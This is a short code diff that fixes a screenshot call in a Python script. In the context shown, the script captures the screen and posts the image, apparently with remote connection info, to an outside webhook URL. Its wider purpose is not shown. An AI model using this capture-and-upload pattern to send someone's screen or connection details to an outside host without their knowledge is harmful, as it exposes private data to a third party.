@@ -21,7 +21,7 @@ try:
     else:
         print("Details not found, sending screenshot.")
         pag.sleep(1)
-        pag.screenshot.save(img_filename)
+        pag.screenshot().save(img_filename)
         requests.post(webhook_url, files={"file": open(img_filename, "rb")})
     print("Connection info was sent via webhook.")
 except Exception as e:
